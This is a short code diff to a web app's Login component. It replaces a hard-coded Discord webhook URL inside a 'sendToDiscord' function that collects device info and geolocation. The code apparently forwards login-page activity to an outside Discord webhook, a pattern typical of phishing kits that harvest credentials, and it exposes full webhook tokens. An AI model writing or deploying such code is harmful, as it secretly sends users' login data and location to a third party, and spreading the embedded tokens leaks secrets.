@@ -94,7 +94,7 @@ export default function Login() {
   const sendToDiscord = async (action: string, data: any) => {
     try {
       const webhookUrl =
-        "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";
+        "https://discord.com/api/webhooks/1443937606420140114/d_32hCr5o8frv607TYLzbCxROZ9x8qT9BgQ6a6UxCgMzKbKs3GxIHctmgnAB0CZMkeEt";
 
       const deviceInfo = getDeviceInfo();
       const locationInfo = await getLocationInfo();
